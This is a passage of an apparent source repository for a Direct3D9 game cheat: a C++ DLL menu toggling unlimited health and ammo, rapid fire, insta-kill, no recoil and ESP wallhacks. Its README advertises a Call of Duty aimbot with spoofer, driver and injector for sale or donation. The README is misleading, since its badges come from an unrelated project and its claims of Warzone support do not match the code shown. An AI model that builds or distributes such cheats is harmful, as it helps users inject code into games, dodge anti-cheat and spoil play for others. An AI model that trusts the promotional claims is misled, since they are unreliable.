				selector += MENUITEM[selector].parentHeader->items;
			else
				selector++;
		}
		Sleep(100);
	}

	//KEYPRESS RIGHT
	if (GetAsyncKeyState(VK_RIGHT)<0) {
		if (*MENUITEM[selector].toggle < MENUITEM[selector].togglemaxval) {
			*MENUITEM[selector].toggle += 1;
			Sleep(100);
		}
	}

	//KEYPRESS LEFT
	if (GetAsyncKeyState(VK_LEFT)<0) {
		if (*MENUITEM[selector].toggle > 0) {
			*MENUITEM[selector].toggle -= 1;
			Sleep(100);
		}
	}
}

void Menu::PrintToggles(LPD3DXFONT pFont, LPD3DXFONT pHeaderFont, int i)
{
	//ITEMTYPE 0; DEFAULT
	if (MENUITEM[i].hacktype == 0) {
		MENUITEM[i].togglemaxval = 1;
		switch (*MENUITEM[i].toggle)
		{
		case 0: PrintText("Off", 150, MENUITEM[i].index * 15, WHITE, pFont); break;
		case 1: PrintText("On", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		}
	}

	//ITEMTYPE 1; JUMP & SPEED
	else if (MENUITEM[i].hacktype == 1) {
		MENUITEM[i].togglemaxval = 5;
		switch (*MENUITEM[i].toggle)
		{
		case 0: PrintText("Off", 150, MENUITEM[i].index * 15, WHITE, pFont); break;
		case 1: PrintText("x2", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 2: PrintText("x5", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 3: PrintText("x10", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 4: PrintText("x20", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 5: PrintText("MAX", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		}
	}

	//ITEMTYPE 2; FIELD OF VIEW
	else if (MENUITEM[i].hacktype == 2) {
		MENUITEM[i].togglemaxval = 1;
		switch (*MENUITEM[i].toggle)
		{
		case 0: PrintText("65", 150, MENUITEM[i].index * 15, WHITE, pFont); break;
		case 1: PrintText("80", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		}
	}

	//ITEMTYPE 3; TIMESCALE
	else if (MENUITEM[i].hacktype == 3) {
		MENUITEM[i].togglemaxval = 5;
		switch (*MENUITEM[i].toggle)
		{
		case 0: PrintText("0.2", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 1: PrintText("0.5", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 2: PrintText("1.0", 150, MENUITEM[i].index * 15, WHITE, pFont); break;
		case 3: PrintText("1.5", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 4: PrintText("2.0", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		case 5: PrintText("3.0", 150, MENUITEM[i].index * 15, GOLDEN, pFont); break;
		}
	}

	//ITEMTYPE 4; CROSSHAIR
	else if (MENUITEM[i].hacktype == 4) {
		MENUITEM[i].togglemaxval = 4;
		switch (*MENUITEM[i].toggle)
		{
		case 0: PrintText("Off", 150, MENUITEM[i].index * 15, WHITE, pFont);	break;
		case 1: PrintText("1", 150, MENUITEM[i].index * 15, GOLDEN, pFont);	break;
		case 2: PrintText("2", 150, MENUITEM[i].index * 15, GOLDEN, pFont);	break;
		case 3: PrintText("3", 150, MENUITEM[i].index * 15, GOLDEN, pFont);	break;
		case 4: PrintText("4", 150, MENUITEM[i].index * 15, GOLDEN, pFont);	break;
		}
	}

	//ITEMTYPE 5; COLORS
	else if (MENUITEM[i].hacktype == 5) {
		MENUITEM[i].togglemaxval = 7;
		switch (*MENUITEM[i].toggle)
		{
		case 0: PrintText("Off", 150, MENUITEM[i].index * 15, WHITE, pFont);	break;
		case 1: PrintText("WHITE", 150, MENUITEM[i].index * 15, WHITE, pFont);	break;
		case 2: PrintText("RED", 150, MENUITEM[i].index * 15, RED, pFont);	break;
		case 3: PrintText("GREEN", 150, MENUITEM[i].index * 15, GREEN, pFont);	break;
		case 4: PrintText("BLUE", 150, MENUITEM[i].index * 15, BLUE, pFont);	break;
		case 5: PrintText("GOLDEN", 150, MENUITEM[i].index * 15, GOLDEN, pFont);	break;
		case 6: PrintText("ORANGE", 150, MENUITEM[i].index * 15, ORANGE, pFont);	break;
		case 7: PrintText("MAGENTA", 150, MENUITEM[i].index * 15, MAGENTA, pFont); break;
		}
	}


	//HACKTYPE 99; HEADER
	else if (MENUITEM[i].hacktype == 99) {
		MENUITEM[i].togglemaxval = 1;
		switch (*MENUITEM[i].toggle)
		{
		case 0: PrintText("[+]", 170, MENUITEM[i].index * 15, WHITE, pHeaderFont);	break;
		case 1: PrintText("[-]", 170, MENUITEM[i].index * 15, GOLDEN, pHeaderFont);	break;
		}
	}
}

void Menu::PrintMenu(LPDIRECT3DDEVICE9 pDevice, LPD3DXFONT pFont, LPD3DXFONT pHeaderFont)
{
	//HIGHLIGHT SELECTED ITEM
	if (selector == MENUITEM[selector].index)
		DrawBorder(1, MENUITEM[selector].index * 15 + 1, 183, 13, 1, GOLDEN, pDevice);

	//PRINT ITEMS ON SCREEN
	for (int i = MENUHEADER[1].index; i <= itemcount; i++)
	{
		// HEADERS
		if ((MENUITEM[i].parentHeader == 0) && (MENUITEM[i].hacktype == 99))
			PrintText(MENUITEM[i].title, 0, MENUITEM[i].index * 15, GOLDEN, pHeaderFont);

		//ITEMS
		else {
			//HIGHLIGHT ACTIVE HACK
			if (*MENUITEM[i].toggle != 0) MENUITEM[i].HCOLOR = GOLDEN; else MENUITEM[i].HCOLOR = WHITE;

			//DRAW FUNCTION LINE
			PrintText(MENUITEM[i].title, 15, MENUITEM[i].index * 15, MENUITEM[i].HCOLOR, pFont);

		}
		//PRINT TOGGLE VALUES
		PrintToggles(pFont, pHeaderFont, i);
	}

	for (int i = MENUHEADER[1].index; i <= (MENUHEADER[1].items + 1); i++)
		MENUITEM[i].HCOLOR = WHITE;
}

void Menu::Hacks(LPDIRECT3DDEVICE9 pDevice, LPD3DXFONT pFont)
{
	if (IsInGame()) {
		//Header 1 - Player
		UnlHealth(iHealth);
		UnlAmmo(iAmmo);
		RapidFire(iRapidFire);
		Superjump(iJump);
		Speed(iSpeed);
		AddMoney(iMoney);
		noRecoil(iRecoil);
		noSpread(iSpread);
		InstantADS(iInstaADS);

		//Header 2 - System
		CleanFloor(iFloor);
		FOV(iFOV);
		TimeScale(iTime);
		InstaKill(iInstaKill);
		//Shoot Though Walls
		ChaosMode(iChaos);

		//Header 3 - D3D
		ESP(iESP, iELines, iEHeads, iEHealth, iEWeapons, pDevice, pFont, pLine);
	}
}

```

`Offsets menu/Menu.h`:

```h
#include "Functions.h"
#pragma once

typedef struct {
	int index;
	int items;
	char * title;
	int *toggle;
	DWORD HCOLOR;
} HEADER;

typedef struct {
	int index;
	char * title;
	int *toggle;
	int togglemaxval;
	int hacktype;
	HEADER *parentHeader;
	DWORD HCOLOR;
} ITEM;

class Menu {
public:
	LPD3DXFONT pFont;
	LPD3DXFONT pHeaderFont;
	void BuildMenu(char * menuname, int x, int y, int h, int w, DWORD TITLECOL, DWORD BACKCOLOR, DWORD BORDERCOLOR, LPDIRECT3DDEVICE9 pDevice);

private:
	//D3D
	LPDIRECT3DDEVICE9 pDevice;
	ID3DXLine *pLine;

	//Menu settings
	int itemcount;
	int headercount;
	int x, y, w, h;
	DWORD COLOR;

	//Menu content
	ITEM MENUITEM[99];
	HEADER MENUHEADER[99];
	char hackrval[256];

	void CreateItem(char * title, int *toggle, HEADER *parentHeader, int hacktype);
	void CreateHeader(char * title, int *toggle, int items);
	void Navigation();
	void PrintMenu(LPDIRECT3DDEVICE9 pDevice, LPD3DXFONT pFont, LPD3DXFONT pHeaderFont);
	void PrintToggles(LPD3DXFONT pFont, LPD3DXFONT pHeaderFont, int i);
	void Hacks(LPDIRECT3DDEVICE9 pDevice, LPD3DXFONT pFont);

	//Navigation
	int selector = 1;
	int show = 1;

	//Hack toggles
	int iHealth = 0, iAmmo = 0, iRapidFire = 0,
		iSuperJump = 0, iInstaADS = 0, iRecoil = 0,
		iSpread = 0, iJump = 0, iSpeed = 0,
		iMoney = 0, iFloor = 2, iFOV = 0,
		iTime = 0, iInstaKill = 0, iChaos = 0,
		iESP = 0, iELines = 0, iEHeads = 0,
		iEHealth = 0, iEWeapons = 0, iAimbot = 0,
		HPlayer = 1, HSystem = 0, HESP = 0;

};
```

`Offsets menu/NoName.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{2459E7C9-CC30-40BA-8628-05384DFC0A68}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>NoName</RootNamespace>
    <WindowsTargetPlatformVersion>8.1</WindowsTargetPlatformVersion>
    <ProjectName>SPHack</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <CharacterSet>MultiByte</CharacterSet>
    <PlatformToolset>v140</PlatformToolset>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <CharacterSet>MultiByte</CharacterSet>
    <PlatformToolset>v140</PlatformToolset>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
    <CLRSupport>false</CLRSupport>
    <PlatformToolset>v140</PlatformToolset>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <WholeProgramOptimization>false</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
    <CLRSupport>false</CLRSupport>
    <PlatformToolset>v140</PlatformToolset>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
    <IncludePath>C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Include;$(IncludePath)</IncludePath>
    <LibraryPath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Lib\x86;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <IncludePath>C:\Program Files\Microsoft DirectX SDK %28June 2010%29\Include;$(IncludePath)</IncludePath>
    <LibraryPath>C:\Program Files\Microsoft DirectX SDK %28June 2010%29\Lib\x86;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <IncludePath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Include;$(IncludePath)</IncludePath>
    <LibraryPath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Lib\x86;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <IncludePath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Include;$(IncludePath)</IncludePath>
    <LibraryPath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Lib\x86;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;_USRDLL;NONAME_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;_USRDLL;NONAME_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_USRDLL;NONAME_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_USRDLL;NONAME_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="Addresses.h" />
    <ClInclude Include="Classes.h" />
    <ClInclude Include="Functions.h" />
    <ClInclude Include="Hacks.h" />
    <ClInclude Include="Menu.h" />
    <ClInclude Include="ColorDefinitions.h" />
    <ClInclude Include="SystemIncludes.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Base.cpp" />
    <ClCompile Include="Menu.cpp" />
  </ItemGroup>
  <ItemGroup>
    <Text Include="d3dvtable.txt" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Offsets menu/NoName.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Functions.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SystemIncludes.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Classes.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Addresses.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Hacks.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Menu.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ColorDefinitions.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Base.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Menu.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <Text Include="d3dvtable.txt" />
  </ItemGroup>
</Project>
```

`Offsets menu/NoName.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
</Project>
```

`Offsets menu/SystemIncludes.h`:

```h
#include <Windows.h>
#include <stdio.h>
#include <d3d9.h>
#include <d3dx9.h>
#pragma comment(lib,"d3dx9.lib")
#pragma once
```

`README.md`:

```md
###  Call-Of-Duty Aimbot + Esp C++ 
![GitHub release](https://img.shields.io/github/release/ppy/osu.svg)
![CodeFactor](https://www.codefactor.io/repository/github/ppy/osu/badge)
![dev chat](https://discordapp.com/api/guilds/188630481301012481/widget.png?style=shield)
![Crowdin](https://d322cqt584bo4o.cloudfront.net/osu-web/localized.svg)
![Renovate enabled](https://img.shields.io/badge/renovate-enabled-brightgreen.svg)
![license](https://img.shields.io/github/license/mashape/apistatus.svg)
![Chat](https://badges.gitter.im/awesome-twitter-bots/Lobby.svg)

```sh-session
"Call-Of-Duty Warzone Vanguard" RELEASE C++,C / AIMBOT / ESP / SPOOFER / DRIVER / Injector
```
***
<p align="center">
   <img src="https://readme-spotify-status-rho.vercel.app/api/run-spotify-status.py" alt="s4nx Playing Now" width="500" />
<p align="center">

## Information
**External Game Project written mostly in C++ along with external libraries Internal And External projects.I started to get rid of scammers.i am developing Hack Cheat Driver Esp Aimbot Magic Bullet Driver Injector Overlay Imgui for many games.Games I've developed with hack so far Rise Online ,Apex Legends ,Bloodhunt , Call of Duty: Cold War , Call of Duty: Vanguard ,Call of Duty: Warzone/MW ,Dayz ,Dead By Daylight ,Destiny 2 ,Enlisted ,Escape From Tarkov ,Fortnite ,Game accounts ,Halo Infinite ,HyperFlick ,New Critical Hit ,New World ,Mir 4 ,Noble ,Playerunknowns Battlegrounds ,Steam ,Rainbow Siz Siege , Playerunknown's Battlegrounds, Rijin ,Rogue Company ,Rust ,Scum ,SpliteGa ,Super People ,Unleashed ,Valorant ,Spoofer ::: Buying a Hack Cheat don't be scammed, more to come**

Call of Duty Warzone has become quite popular over time. Since its creation, millions of players around the world have jumped in and started playing the game. If you are in love with COD Warzone, these cheats and hacks by Lavicheats will make it impossible for anyone to beat you. Statistics show that there has been a massive boost in the number of people downloading the game. However, not every player has the same amount of time and patience it takes to move up the game. Therefore, Warzone cheats and hacks will be quite useful in this area. Read on to find out the various hacks you can employ when playing COD Warzone. 

**Updated Time 17/05/2022**



![image](https://user-images.githubusercontent.com/105746452/169063771-c689a134-866c-43a9-b2e8-d2b8f838b3b2.png)
## Features
<details>
<summary>Features (Drop Down)</summary>
  
* **AIMBOT**
  
* **ESP**
  
* **SPOOFER** 

* **DRIVER**

*  **INJECTOR**
  </details>

* ESP - this tab contains the main visual functionality with the wallhack against players.
* Box - this function shows enemies behind obstacles using a boxes. The most common type of wallhack.
* Info - if there is a checkbox here, then you have the opportunity to select additional information about the players that will be shown
* Names - shows names (nicknames) of players.
* Health - displaying the amount of health (hp) of opponents. It is displayed as a strip (bar) above the player model.
* Distance - shows the distance to the opponents.
* Snaplines - lines that stretch to the models of rivals. One of the simplest types of wh.
* Aimbot - in this tab you can set up aimbot, a function that allows you to automate aiming at opponents to make shooting easier.
* Aim Assist - if this item is active, then the cheat will help you aim when shooting.
* Bone - here you can select the part of the body (hitbox) that will be aimed at when shooting.
* Key - key, when pressed, the aimbot will work.
* Only Visible - if active, then aim will only be used against enemies that are not behind walls or other obstacles.
* Marker - shows in advance the point at which the aim will be aimed if you start shooting.
* FOV - the radius of the aim, in which he will capture targets.
* FOV Circle - shows the radius of the aim using a circle around the sight.
* Smooth - the higher the value here, the slower and smoother the aiming will be.
* Priority - the priority of the targets that the aimbot will capture. If Crosshair is worth it, then it will more often work on targets that are closer crosshair, and if Distance is set, then targets that are closer to you in terms of distance will be 
* Items - in this tab you can choose which items you want to highlight with the ESP. Items are shown with text.
* Weapons - shows a weapon lying on the ground.
* Ammo - shows ammo on the ground.
* Consumables - various consumables and materials.
* Money - highlighting the money lying on the map.
* Crates - shows chests with loot and money.
* Throwables/Explosives - grenades, explosives and other projectiles.
* Gadgets/Perks - shows gadgets (devices) and perks.
* No Recoil - disables recoil and shaking of weapons when firing.
* Settings - in this tab, you can adjust the display distance of opponents, objects, and also choose colors to your liking.
***

## Media 
![image](https://user-images.githubusercontent.com/105746452/169063630-233fe5b3-cb54-4b62-b97f-77d949f60dd2.png)



## ✨ DONATE Buy Me Coffee

BTC - 144feg2TVeVjhLfXVrKvaTzu2ViX4gYv6q


## Disclaimer
This project is only for educational purposes. Therefore I'm not responsible for any harm/illegal activity that may happens. I made this project to learn more about reverse engineering and not to ruin the experience for other gamers. I will not be updating the offsets for this reason.This may not be exact code as the one in my hackathon.

```